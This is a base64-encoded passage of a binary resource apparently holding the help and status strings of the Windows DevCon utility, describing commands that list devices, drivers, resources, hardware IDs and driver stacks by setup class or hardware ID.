AbQBtAGEAbgBkAA0ACgBMAGkAcwB0AHMAIABhAGwAbAAgAGQAZQB2AGkAYwBlAHMAIABpAG4AIAB0AGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAcwBlAHQAdQBwACAAYwBsAGEAcwBzAGUAcwAuACAAVgBhAGwAaQBkACAAbwBuACAAbABvAGMAYQBsACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAGMAbwBtAHAAdQB0AGUAcgBzAC4ADQAKACUAMQAgAFsALQBtADoAXABcADwAbQBhAGMAaABpAG4AZQA+AF0AIAAlADIAIAA8AGMAbABhAHMAcwA+ACAAWwA8AGMAbABhAHMAcwA+AC4ALgAuAF0ADQAKADwAbQBhAGMAaABpAG4AZQA+ACAAIAAgACAAUwBwAGUAYwBpAGYAaQBlAHMAIABhACAAcgBlAG0AbwB0AGUAIABjAG8AbQBwAHUAdABlAHIALgANAAoAPABjAGwAYQBzAHMAPgAgACAAIAAgACAAIABTAHAAZQBjAGkAZgBpAGUAcwAgAGEAIABkAGUAdgBpAGMAZQAgAHMAZQB0AHUAcAAgAGMAbABhAHMAcwAuAA0ACgBEAGUAdgBpAGMAZQAgAGUAbgB0AHIAaQBlAHMAIABoAGEAdgBlACAAdABoAGUAIABmAG8AcgBtAGEAdAAgADwAaQBuAHMAdABhAG4AYwBlAD4AOgAgADwAZABlAHMAYwByAD4ADQAKAHcAaABlAHIAZQAgADwAaQBuAHMAdABhAG4AYwBlAD4AIABpAHMAIABhACAAdQBuAGkAcQB1AGUAIABpAG4AcwB0AGEAbgBjAGUAIABvAGYAIAB0AGgAZQAgAGQAZQB2AGkAYwBlACAAYQBuAGQAIAA8AGQAZQBzAGMAcgA+ACAAaQBzACAAdABoAGUAIABkAGUAdgBpAGMAZQAgAGQAZQBzAGMAcgBpAHAAdABpAG8AbgAuAA0ACgAAAAAAYAABACUAMQAhAC0AMgAwAHMAIQAgAEwAaQBzAHQAIABhAGwAbAAgAGQAZQB2AGkAYwBlAHMAIABpAG4AIABhACAAcwBlAHQAdQBwACAAYwBsAGEAcwBzAC4ADQAKAAAAdAABAEwAaQBzAHQAaQBuAGcAIAAlADEAIQB1ACEAIABkAGUAdgBpAGMAZQBzACAAaQBuACAAcwBlAHQAdQBwACAAYwBsAGEAcwBzACAAIgAlADIAIgAgACgAJQAzACkAIABvAG4AIAAlADQALgANAAoAAABoAAEATABpAHMAdABpAG4AZwAgACUAMQAhAHUAIQAgAGQAZQB2AGkAYwBlAHMAIABpAG4AIABzAGUAdAB1AHAAIABjAGwAYQBzAHMAIAAiACUAMgAiACAAKAAlADMAKQAuAA0ACgAAAFAAAQBUAGgAZQByAGUAIABpAHMAIABuAG8AIAAiACUAMQAiACAAcwBlAHQAdQBwACAAYwBsAGEAcwBzACAAbwBuACAAJQAyAC4ADQAKAAAAcAABAFQAaABlAHIAZQAgAGkAcwAgAG4AbwAgACIAJQAxACIAIABzAGUAdAB1AHAAIABjAGwAYQBzAHMAIABvAG4AIAB0AGgAZQAgAGwAbwBjAGEAbAAgAG0AYQBjAGgAaQBuAGUALgANAAoAAAAAAHQAAQBUAGgAZQByAGUAIABhAHIAZQAgAG4AbwAgAGQAZQB2AGkAYwBlAHMAIABpAG4AIABzAGUAdAB1AHAAIABjAGwAYQBzAHMAIAAiACUAMQAiACAAKAAlADIAKQAgAG8AbgAgACUAMwAuAA0ACgAAAAAAaAABAFQAaABlAHIAZQAgAGEAcgBlACAAbgBvACAAZABlAHYAaQBjAGUAcwAgAGkAbgAgAHMAZQB0AHUAcAAgAGMAbABhAHMAcwAgACIAJQAxACIAIAAoACUAMgApAC4ADQAKAAAAAACABgEARABlAHYAYwBvAG4AIABGAGkAbgBkACAAQwBvAG0AbQBhAG4AZAANAAoARgBpAG4AZABzACAAZABlAHYAaQBjAGUAcwAgAHcAaQB0AGgAIAB0AGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAaABhAHIAZAB3AGEAcgBlACAAbwByACAAaQBuAHMAdABhAG4AYwBlACAASQBEAC4AIABWAGEAbABpAGQAIABvAG4AIABsAG8AYwBhAGwAIABhAG4AZAAgAHIAZQBtAG8AdABlACAAYwBvAG0AcAB1AHQAZQByAHMALgANAAoAJQAxACAAWwAtAG0AOgBcAFwAPABtAGEAYwBoAGkAbgBlAD4AXQAgACUAMgAgADwAaQBkAD4AIABbADwAaQBkAD4ALgAuAC4AXQANAAoAJQAxACAAWwAtAG0AOgBcAFwAPABtAGEAYwBoAGkAbgBlAD4AXQAgACUAMgAgAD0APABjAGwAYQBzAHMAPgAgAFsAPABpAGQAPgAuAC4ALgBdAA0ACgA8AG0AYQBjAGgAaQBuAGUAPgAgACAAIAAgAFMAcABlAGMAaQBmAGkAZQBzACAAYQAgAHIAZQBtAG8AdABlACAAYwBvAG0AcAB1AHQAZQByAC4ADQAKADwAYwBsAGEAcwBzAD4AIAAgACAAIAAgACAAUwBwAGUAYwBpAGYAaQBlAHMAIABhACAAZABlAHYAaQBjAGUAIABzAGUAdAB1AHAAIABjAGwAYQBzAHMALgANAAoARQB4AGEAbQBwAGwAZQBzACAAbwBmACAAPABpAGQAPgA6AA0ACgAgACoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0AIABBAGwAbAAgAGQAZQB2AGkAYwBlAHMADQAKACAASQBTAEEAUABOAFAAXABQAE4AUAAwADUAMAAxACAALQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAANAAoAIAAqAFAATgBQACoAIAAgACAAIAAgACAAIAAgACAAIAAtACAASABhAHIAZAB3AGEAcgBlACAASQBEACAAdwBpAHQAaAAgAHcAaQBsAGQAYwBhAHIAZABzACAAIAAoACoAIABtAGEAdABjAGgAZQBzACAAYQBuAHkAdABoAGkAbgBnACkADQAKACAAQABJAFMAQQBQAE4AUABcACoAXAAqACAAIAAgACAALQAgAEkAbgBzAHQAYQBuAGMAZQAgAEkARAAgAHcAaQB0AGgAIAB3AGkAbABkAGMAYQByAGQAcwAgACAAKABAACAAcAByAGUAZgBpAHgAZQBzACAAaQBuAHMAdABhAG4AYwBlACAASQBEACkADQAKACAAJwAqAFAATgBQADAANQAwADEAIAAgACAAIAAgACAALQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAAgAHcAaQB0AGgAIABhAHAAbwBzAHQAcgBvAHAAaABlACAAKAAnACAAcAByAGUAZgBpAHgAZQBzACAAbABpAHQAZQByAGEAbAAgAG0AYQB0AGMAaAAgAC0AIABtAGEAdABjAGgAZQBzACAAZQB4AGEAYwB0AGwAeQAgAGEAcwAgAHQAeQBwAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBuAGMAbAB1AGQAaQBuAGcAIAB0AGgAZQAgAGEAcwB0AGUAcgBpAHMAawAuACkADQAKAEQAZQB2AGkAYwBlACAAZQBuAHQAcgBpAGUAcwAgAGgAYQB2AGUAIAB0AGgAZQAgAGYAbwByAG0AYQB0ACAAPABpAG4AcwB0AGEAbgBjAGUAPgA6ACAAPABkAGUAcwBjAHIAPgANAAoAdwBoAGUAcgBlACAAPABpAG4AcwB0AGEAbgBjAGUAPgAgAGkAcwAgAHQAaABlACAAdQBuAGkAcQB1AGUAIABpAG4AcwB0AGEAbgBjAGUAIABvAGYAIAB0AGgAZQAgAGQAZQB2AGkAYwBlACAAYQBuAGQAIAA8AGQAZQBzAGMAcgA+ACAAaQBzACAAdABoAGUAIABkAGUAdgBpAGMAZQAgAGQAZQBzAGMAcgBpAHAAdABpAG8AbgAuAA0ACgAAADgAAQAlADEAIQAtADIAMABzACEAIABGAGkAbgBkACAAZABlAHYAaQBjAGUAcwAuAA0ACgAAAAAATAABAE4AbwAgAG0AYQB0AGMAaABpAG4AZwAgAGQAZQB2AGkAYwBlAHMAIABmAG8AdQBuAGQAIABvAG4AIAAlADEALgANAAoAAAAAAEAAAQBOAG8AIABtAGEAdABjAGgAaQBuAGcAIABkAGUAdgBpAGMAZQBzACAAZgBvAHUAbgBkAC4ADQAKAAAAAABUAAEAJQAxACEAdQAhACAAbQBhAHQAYwBoAGkAbgBnACAAZABlAHYAaQBjAGUAKABzACkAIABmAG8AdQBuAGQAIABvAG4AIAAlADIALgANAAoAAABIAAEAJQAxACEAdQAhACAAbQBhAHQAYwBoAGkAbgBnACAAZABlAHYAaQBjAGUAKABzACkAIABmAG8AdQBuAGQALgANAAoAAADgBgEARABlAHYAYwBvAG4AIABGAGkAbgBkAGEAbABsACAAQwBvAG0AbQBhAG4AZAANAAoARgBpAG4AZABzACAAZABlAHYAaQBjAGUAcwAgAHcAaQB0AGgAIAB0AGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAaABhAHIAZAB3AGEAcgBlACAAbwByACAAaQBuAHMAdABhAG4AYwBlACAASQBEACwAIABpAG4AYwBsAHUAZABpAG4AZwAgAGQAZQB2AGkAYwBlAHMADQAKAHQAaABhAHQAIABhAHIAZQAgAG4AbwB0ACAAYwB1AHIAcgBlAG4AdABsAHkAIABhAHQAdABhAGMAaABlAGQALgAgAFYAYQBsAGkAZAAgAG8AbgAgAGwAbwBjAGEAbAAgAGEAbgBkACAAcgBlAG0AbwB0AGUAIABjAG8AbQBwAHUAdABlAHIAcwAuAA0ACgAlADEAIABbAC0AbQA6AFwAXAA8AG0AYQBjAGgAaQBuAGUAPgBdACAAJQAyACAAPABpAGQAPgAgAFsAPABpAGQAPgAuAC4ALgBdAA0ACgAlADEAIABbAC0AbQA6AFwAXAA8AG0AYQBjAGgAaQBuAGUAPgBdACAAJQAyACAAPQA8AGMAbABhAHMAcwA+ACAAWwA8AGkAZAA+AC4ALgAuAF0ADQAKADwAbQBhAGMAaABpAG4AZQA+ACAAIAAgACAAUwBwAGUAYwBpAGYAaQBlAHMAIABhACAAcgBlAG0AbwB0AGUAIABjAG8AbQBwAHUAdABlAHIALgANAAoAPABjAGwAYQBzAHMAPgAgACAAIAAgACAAIABTAHAAZQBjAGkAZgBpAGUAcwAgAGEAIABkAGUAdgBpAGMAZQAgAHMAZQB0AHUAcAAgAGMAbABhAHMAcwAuAA0ACgBFAHgAYQBtAHAAbABlAHMAIABvAGYAIAA8AGkAZAA+ADoADQAKACAAKgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAgAEEAbABsACAAZABlAHYAaQBjAGUAcwANAAoAIABJAFMAQQBQAE4AUABcAFAATgBQADAANQAwADEAIAAtACAASABhAHIAZAB3AGEAcgBlACAASQBEAA0ACgAgACoAUABOAFAAKgAgACAAIAAgACAAIAAgACAAIAAgAC0AIABIAGEAcgBkAHcAYQByAGUAIABJAEQAIAB3AGkAdABoACAAdwBpAGwAZABjAGEAcgBkAHMAIAAgACgAKgAgAG0AYQB0AGMAaABlAHMAIABhAG4AeQB0AGgAaQBuAGcAKQANAAoAIABAAEkAUwBBAFAATgBQAFwAKgBcACoAIAAgACAAIAAtACAASQBuAHMAdABhAG4AYwBlACAASQBEACAAdwBpAHQAaAAgAHcAaQBsAGQAYwBhAHIAZABzACAAIAAoAEAAIABwAHIAZQBmAGkAeABlAHMAIABpAG4AcwB0AGEAbgBjAGUAIABJAEQAKQANAAoAIAAnACoAUABOAFAAMAA1ADAAMQAgACAAIAAgACAAIAAtACAASABhAHIAZAB3AGEAcgBlACAASQBEACAAdwBpAHQAaAAgAGEAcABvAHMAdAByAG8AcABoAGUAIAAoACcAIABwAHIAZQBmAGkAeABlAHMAIABsAGkAdABlAHIAYQBsACAAbQBhAHQAYwBoACAALQAgAG0AYQB0AGMAaABlAHMAIABlAHgAYQBjAHQAbAB5ACAAYQBzACAAdAB5AHAAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAG4AYwBsAHUAZABpAG4AZwAgAHQAaABlACAAYQBzAHQAZQByAGkAcwBrAC4AKQANAAoARABlAHYAaQBjAGUAIABlAG4AdAByAGkAZQBzACAAaABhAHYAZQAgAHQAaABlACAAZgBvAHIAbQBhAHQAIAA8AGkAbgBzAHQAYQBuAGMAZQA+ADoAIAA8AGQAZQBzAGMAcgA+AA0ACgB3AGgAZQByAGUAIAA8AGkAbgBzAHQAYQBuAGMAZQA+ACAAaQBzACAAdABoAGUAIAB1AG4AaQBxAHUAZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgAHQAaABlACAAZABlAHYAaQBjAGUAIABhAG4AZAAgADwAZABlAHMAYwByAD4AIABpAHMAIAB0AGgAZQAgAGQAZQBzAGMAcgBpAHAAdABpAG8AbgAuAA0ACgAAAJgAAQAlADEAIQAtADIAMABzACEAIABGAGkAbgBkACAAZABlAHYAaQBjAGUAcwAsACAAaQBuAGMAbAB1AGQAaQBuAGcAIAB0AGgAbwBzAGUAIAB0AGgAYQB0ACAAYQByAGUAIABuAG8AdAAgAGMAdQByAHIAZQBuAHQAbAB5ACAAYQB0AHQAYQBjAGgAZQBkAC4ADQAKAAAAkAUBAEQAZQB2AGMAbwBuACAAUwB0AGEAdAB1AHMAIABDAG8AbQBtAGEAbgBkAA0ACgBMAGkAcwB0AHMAIAB0AGgAZQAgAHIAdQBuAG4AaQBuAGcAIABzAHQAYQB0AHUAcwAgAG8AZgAgAGQAZQB2AGkAYwBlAHMAIAB3AGkAdABoACAAdABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGgAYQByAGQAdwBhAHIAZQAgAG8AcgAgAGkAbgBzAHQAYQBuAGMAZQAgAEkARAAuAA0ACgBWAGEAbABpAGQAIABvAG4AIABsAG8AYwBhAGwAIABhAG4AZAAgAHIAZQBtAG8AdABlACAAYwBvAG0AcAB1AHQAZQByAHMALgANAAoAJQAxACAAWwAtAG0AOgBcAFwAPABtAGEAYwBoAGkAbgBlAD4AXQAgACUAMgAgADwAaQBkAD4AIABbADwAaQBkAD4ALgAuAC4AXQANAAoAJQAxACAAWwAtAG0AOgBcAFwAPABtAGEAYwBoAGkAbgBlAD4AXQAgACUAMgAgAD0APABjAGwAYQBzAHMAPgAgAFsAPABpAGQAPgAuAC4ALgBdAA0ACgA8AG0AYQBjAGgAaQBuAGUAPgAgACAAIAAgAFMAcABlAGMAaQBmAGkAZQBzACAAYQAgAHIAZQBtAG8AdABlACAAYwBvAG0AcAB1AHQAZQByAC4ADQAKADwAYwBsAGEAcwBzAD4AIAAgACAAIAAgACAAUwBwAGUAYwBpAGYAaQBlAHMAIABhACAAZABlAHYAaQBjAGUAIABzAGUAdAB1AHAAIABjAGwAYQBzAHMALgANAAoARQB4AGEAbQBwAGwAZQBzACAAbwBmACAAPABpAGQAPgA6AA0ACgAgACoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0AIABBAGwAbAAgAGQAZQB2AGkAYwBlAHMADQAKACAASQBTAEEAUABOAFAAXABQAE4AUAAwADUAMAAxACAALQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAANAAoAIAAqAFAATgBQACoAIAAgACAAIAAgACAAIAAgACAAIAAtACAASABhAHIAZAB3AGEAcgBlACAASQBEACAAdwBpAHQAaAAgAHcAaQBsAGQAYwBhAHIAZABzACAAIAAoACoAIABtAGEAdABjAGgAZQBzACAAYQBuAHkAdABoAGkAbgBnACkADQAKACAAQABJAFMAQQBQAE4AUABcACoAXAAqACAAIAAgACAALQAgAEkAbgBzAHQAYQBuAGMAZQAgAEkARAAgAHcAaQB0AGgAIAB3AGkAbABkAGMAYQByAGQAcwAgACAAKABAACAAcAByAGUAZgBpAHgAZQBzACAAaQBuAHMAdABhAG4AYwBlACAASQBEACkADQAKACAAJwAqAFAATgBQADAANQAwADEAIAAgACAAIAAgACAALQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAAgAHcAaQB0AGgAIABhAHAAbwBzAHQAcgBvAHAAaABlACAAKAAnACAAcAByAGUAZgBpAHgAZQBzACAAbABpAHQAZQByAGEAbAAgAG0AYQB0AGMAaAAgAC0AIABtAGEAdABjAGgAZQBzACAAZQB4AGEAYwB0AGwAeQAgAGEAcwAgAHQAeQBwAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBuAGMAbAB1AGQAaQBuAGcAIAB0AGgAZQAgAGEAcwB0AGUAcgBpAHMAawAuACkADQAKAAAAAABcAAEAJQAxACEALQAyADAAcwAhACAATABpAHMAdAAgAHIAdQBuAG4AaQBuAGcAIABzAHQAYQB0AHUAcwAgAG8AZgAgAGQAZQB2AGkAYwBlAHMALgANAAoAAAAAAAAFAQBEAGUAdgBjAG8AbgAgAEQAcgBpAHYAZQByAGYAaQBsAGUAcwAgAEMAbwBtAG0AYQBuAGQADQAKAEwAaQBzAHQAIABpAG4AcwB0AGEAbABsAGUAZAAgAGQAcgBpAHYAZQByACAAZgBpAGwAZQBzACAAZgBvAHIAIABkAGUAdgBpAGMAZQBzACAAdwBpAHQAaAAgAHQAaABlACAAcwBwAGUAYwBpAGYAaQBlAGQAIABoAGEAcgBkAHcAYQByAGUAIABvAHIADQAKAGkAbgBzAHQAYQBuAGMAZQAgAEkARAAuACAAVgBhAGwAaQBkACAAbwBuAGwAeQAgAG8AbgAgAHQAaABlACAAbABvAGMAYQBsACAAYwBvAG0AcAB1AHQAZQByAC4ADQAKACUAMQAgACUAMgAgADwAaQBkAD4AIABbADwAaQBkAD4ALgAuAC4AXQANAAoAJQAxACAAJQAyACAAPQA8AGMAbABhAHMAcwA+ACAAWwA8AGkAZAA+AC4ALgAuAF0ADQAKADwAYwBsAGEAcwBzAD4AIAAgACAAIAAgACAAUwBwAGUAYwBpAGYAaQBlAHMAIABhACAAZABlAHYAaQBjAGUAIABzAGUAdAB1AHAAIABjAGwAYQBzAHMALgANAAoARQB4AGEAbQBwAGwAZQBzACAAbwBmACAAPABpAGQAPgA6AA0ACgAgACoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC0AIABBAGwAbAAgAGQAZQB2AGkAYwBlAHMADQAKACAASQBTAEEAUABOAFAAXABQAE4AUAAwADUAMAAxACAALQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAANAAoAIAAqAFAATgBQACoAIAAgACAAIAAgACAAIAAgACAAIAAtACAASABhAHIAZAB3AGEAcgBlACAASQBEACAAdwBpAHQAaAAgAHcAaQBsAGQAYwBhAHIAZABzACAAIAAoACoAIABtAGEAdABjAGgAZQBzACAAYQBuAHkAdABoAGkAbgBnACkADQAKACAAQABJAFMAQQBQAE4AUABcACoAXAAqACAAIAAgACAALQAgAEkAbgBzAHQAYQBuAGMAZQAgAEkARAAgAHcAaQB0AGgAIAB3AGkAbABkAGMAYQByAGQAcwAgACAAKABAACAAcAByAGUAZgBpAHgAZQBzACAAaQBuAHMAdABhAG4AYwBlACAASQBEACkADQAKACAAJwAqAFAATgBQADAANQAwADEAIAAgACAAIAAgACAALQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAAgAHcAaQB0AGgAIABhAHAAbwBzAHQAcgBvAHAAaABlACAAKAAnACAAcAByAGUAZgBpAHgAZQBzACAAbABpAHQAZQByAGEAbAAgAG0AYQB0AGMAaAAgAC0AIABtAGEAdABjAGgAZQBzACAAZQB4AGEAYwB0AGwAeQAgAGEAcwAgAHQAeQBwAGUAZAAsAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBuAGMAbAB1AGQAaQBuAGcAIAB0AGgAZQAgAGEAcwB0AGUAcgBpAHMAawAuACkADQAKAAAAbAABACUAMQAhAC0AMgAwAHMAIQAgAEwAaQBzAHQAIABpAG4AcwB0AGEAbABsAGUAZAAgAGQAcgBpAHYAZQByACAAZgBpAGwAZQBzACAAZgBvAHIAIABkAGUAdgBpAGMAZQBzAC4ADQAKAAAAvAUBAEQAZQB2AGMAbwBuACAAUgBlAHMAbwB1AHIAYwBlAHMAIABDAG8AbQBtAGEAbgBkAA0ACgBMAGkAcwB0AHMAIABoAGEAcgBkAHcAYQByAGUAIAByAGUAcwBvAHUAcgBjAGUAcwAgAG8AZgAgAGQAZQB2AGkAYwBlAHMAIAB3AGkAdABoACAAdABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGgAYQByAGQAdwBhAHIAZQAgAG8AcgAgAGkAbgBzAHQAYQBuAGMAZQAgAEkARAAuAA0ACgBWAGEAbABpAGQAIABvAG4AIABsAG8AYwBhAGwAIABhAG4AZAAgAHIAZQBtAG8AdABlACAAYwBvAG0AcAB1AHQAZQByAHMALgANAAoAJQAxACAAWwAtAG0AOgBcAFwAPABtAGEAYwBoAGkAbgBlAD4AXQAgACUAMgAgADwAaQBkAD4AIABbADwAaQBkAD4ALgAuAC4AXQANAAoAJQAxACAAWwAtAG0AOgBcAFwAPABtAGEAYwBoAGkAbgBlAD4AXQAgACUAMgAgAD0APABjAGwAYQBzAHMAPgAgAFsAPABpAGQAPgAuAC4ALgBdAA0ACgA8AG0AYQBjAGgAaQBuAGUAPgAgACAAIAAgAFMAcABlAGMAaQBmAGkAZQBzACAAYQAgAHIAZQBtAG8AdABlACAAYwBvAG0AcAB1AHQAZQByAC4AIAANAAoAPABjAGwAYQBzAHMAPgAgACAAIAAgACAAIABTAHAAZQBjAGkAZgBpAGUAcwAgAGEAIABkAGUAdgBpAGMAZQAgAHMAZQB0AHUAcAAgAGMAbABhAHMAcwAuAA0ACgBFAHgAYQBtAHAAbABlAHMAIABvAGYAIAA8AGkAZAA+ADoADQAKAEUAeABhAG0AcABsAGUAcwAgAG8AZgAgADwAaQBkAD4AOgANAAoAIAAqACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAtACAAQQBsAGwAIABkAGUAdgBpAGMAZQBzAA0ACgAgAEkAUwBBAFAATgBQAFwAUABOAFAAMAA1ADAAMQAgAC0AIABIAGEAcgBkAHcAYQByAGUAIABJAEQADQAKACAAKgBQAE4AUAAqACAAIAAgACAAIAAgACAAIAAgACAALQAgAEgAYQByAGQAdwBhAHIAZQAgAEkARAAgAHcAaQB0AGgAIAB3AGkAbABkAGMAYQByAGQAcwAgACAAKAAqACAAbQBhAHQAYwBoAGUAcwAgAGEAbgB5AHQAaABpAG4AZwApAA0ACgAgAEAASQBTAEEAUABOAFAAXAAqAFwAKgAgACAAIAAgAC0AIABJAG4AcwB0AGEAbgBjAGUAIABJAEQAIAB3AGkAdABoACAAdwBpAGwAZABjAGEAcgBkAHMAIAAgACgAQAAgAHAAcgBlAGYAaQB4AGUAcwAgAGkAbgBzAHQAYQBuAGMAZQAgAEkARAApAA0ACgAgACcAKgBQAE4AUAAwADUAMAAxACAAIAAgACAAIAAgAC0AIABIAGEAcgBkAHcAYQByAGUAIABJAEQAIAB3AGkAdABoACAAYQBwAG8AcwB0AHIAbwBwAGgAZQAgACgAJwAgAHAAcgBlAGYAaQB4AGUAcwAgAGwAaQB0AGUAcgBhAGwAIABtAGEAdABjAGgAIAAtACAAbQBhAHQAYwBoAGUAcwAgAGUAeABhAGMAdABsAHkAIABhAHMAIAB0AHkAcABlAGQALAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAbgBjAGwAdQBkAGkAbgBnACAAdABoAGUAIABhAHMAdABlAHIAaQBzAGsALgApAA0ACgAAAGQAAQAlADEAIQAtADIAMABzACEAIABMAGkAcwB0ACAAaABhAHIAZAB3AGEAcgBlACAAcgBlAHMAbwB1AHIAYwBlAHMAIABmAG8AcgAgAGQAZQB2AGkAYwBlAHMALgANAAoAAACIBQEARABlAHYAYwBvAG4AIABIAHcAaQBkAHMAIABDAG8AbQBtAGEAbgBkAA0ACgBMAGkAcwB0AHMAIABoAGEAcgBkAHcAYQByAGUAIABJAEQAcwAgAG8AZgAgAGEAbABsACAAZABlAHYAaQBjAGUAcwAgAHcAaQB0AGgAIAB0AGgAZQAgAHMAcABlAGMAaQBmAGkAZQBkACAAaABhAHIAZAB3AGEAcgBlACAAbwByACAAaQBuAHMAdABhAG4AYwBlACAASQBEAC4ADQAKAFYAYQBsAGkAZAAgAG8AbgAgAGwAbwBjAGEAbAAgAGEAbgBkACAAcgBlAG0AbwB0AGUAIABjAG8AbQBwAHUAdABlAHIAcwAuAA0ACgAlADEAIABbAC0AbQA6AFwAXAA8AG0AYQBjAGgAaQBuAGUAPgBdACAAJQAyACAAPABpAGQAPgAgAFsAPABpAGQAPgAuAC4ALgBdAA0ACgAlADEAIABbAC0AbQA6AFwAXAA8AG0AYQBjAGgAaQBuAGUAPgBdACAAJQAyACAAPQA8AGMAbABhAHMAcwA+ACAAWwA8AGkAZAA+AC4ALgAuAF0ADQAKADwAbQBhAGMAaABpAG4AZQA+ACAAIAAgACAAUwBwAGUAYwBpAGYAaQBlAHMAIABhACAAcgBlAG0AbwB0AGUAIABjAG8AbQBwAHUAdABlAHIALgANAAoAPABjAGwAYQBzAHMAPgAgACAAIAAgACAAIABTAHAAZQBjAGkAZgBpAGUAcwAgAGEAIABkAGUAdgBpAGMAZQAgAHMAZQB0AHUAcAAgAGMAbABhAHMAcwAuAA0ACgBFAHgAYQBtAHAAbABlAHMAIABvAGYAIAA8AGkAZAA+ADoADQAKACAAKgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAALQAgAEEAbABsACAAZABlAHYAaQBjAGUAcwANAAoAIABJAFMAQQBQAE4AUABcAFAATgBQADAANQAwADEAIAAtACAASABhAHIAZAB3AGEAcgBlACAASQBEAA0ACgAgACoAUABOAFAAKgAgACAAIAAgACAAIAAgACAAIAAgAC0AIABIAGEAcgBkAHcAYQByAGUAIABJAEQAIAB3AGkAdABoACAAdwBpAGwAZABjAGEAcgBkAHMAIAAgACgAKgAgAG0AYQB0AGMAaABlAHMAIABhAG4AeQB0AGgAaQBuAGcAKQANAAoAIABAAEkAUwBBAFAATgBQAFwAKgBcACoAIAAgACAAIAAtACAASQBuAHMAdABhAG4AYwBlACAASQBEACAAdwBpAHQAaAAgAHcAaQBsAGQAYwBhAHIAZABzACAAIAAoAEAAIABwAHIAZQBmAGkAeABlAHMAIABpAG4AcwB0AGEAbgBjAGUAIABJAEQAKQANAAoAIAAnACoAUABOAFAAMAA1ADAAMQAgACAAIAAgACAAIAAtACAASABhAHIAZAB3AGEAcgBlACAASQBEACAAdwBpAHQAaAAgAGEAcABvAHMAdAByAG8AcABoAGUAIAAoACcAIABwAHIAZQBmAGkAeABlAHMAIABsAGkAdABlAHIAYQBsACAAbQBhAHQAYwBoACAALQAgAG0AYQB0AGMAaABlAHMAIABlAHgAYQBjAHQAbAB5ACAAYQBzACAAdAB5AHAAZQBkACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAG4AYwBsAHUAZABpAG4AZwAgAHQAaABlACAAYQBzAHQAZQByAGkAcwBrAC4AKQANAAoAAABYAAEAJQAxACEALQAyADAAcwAhACAATABpAHMAdAAgAGgAYQByAGQAdwBhAHIAZQAgAEkARABzACAAbwBmACAAZABlAHYAaQBjAGUAcwAuAA0ACgAAAAAAMAYBAEQAZQB2AGMAbwBuACAAUwB0AGEAYwBrACAAQwBvAG0AbQBhAG4AZAANAAoATABpAHMAdABzACAAdABoAGUAIABlAHgAcABlAGMAdABlAGQAIABkAHIAaQB2AGUAcgAgAHMAdABhAGMAawAgAG8AZgAgAGQAZQB2AGkAYwBlAHMAIAB3AGkAdABoACAAdABoAGUAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGgAYQByAGQAdwBhAHIAZQANAAoAbwByACAAaQBuAHMAdABhAG4AYwBlACAASQBEAC4AIABQAG4AUAAgAGMAYQBsAGwAcwAgAGUAYQBjAGgAIABkAHIAaQB2AGUAcgAnAHMAIABBAGQAZABEAGUAdgBpAGMAZQAgAHIAbwB1AHQAaQBuAGUAIAB3AGgAZQBuACAAYgB1AGkAbABkAGkAbgBnAA0ACgB0AGgAZQAgAGQAZQB2AGkAYwBlACAAcwB0AGEAYwBrAC4AIABWAGEAbABpAGQAIABvAG4AIABsAG8AYwBhAGwAIABhAG4AZAAgAHIAZQBtAG8AdABlACAAYwBvAG0AcAB1AHQAZQByAHMALgANAAoAJQAxACAAWwAtAG0AOgBcAFwAPABtAGEAYwBoAGkAbgBlAD4AXQAgACUAMgAgADwAaQBkAD4AIABbADwAaQBkAD4ALgAuAC4AXQANAAoAJQAxACAAWwAtAG0AOgBcAFwAPABtAGEAYwBoAGkAbgBlAD4AXQAgACUAMgAgAD0APABjAGwAYQBzAHMAPgAgAFsAPABpAGQAPgAuAC4ALgBdAA0ACgA8AG0AYQBjAGgAaQBuAGUAPgAgACAAIAAgAFMAcABlAGMAaQBmAGkAZQBzACAAYQAgAHIAZQBtAG8AdABlACAAYwBvAG0AcAB1AHQAZQByAC4ADQAKADwAYwBsAGEAcwBzAD4AIAAgACAAIAAgACAAUwBwAGUAYwBpAGYAaQBlAHMAIABhACAAZABlAHYAaQBjAGUAIABzAGUAdAB1AHAAIABjAGwAYQBzAHMA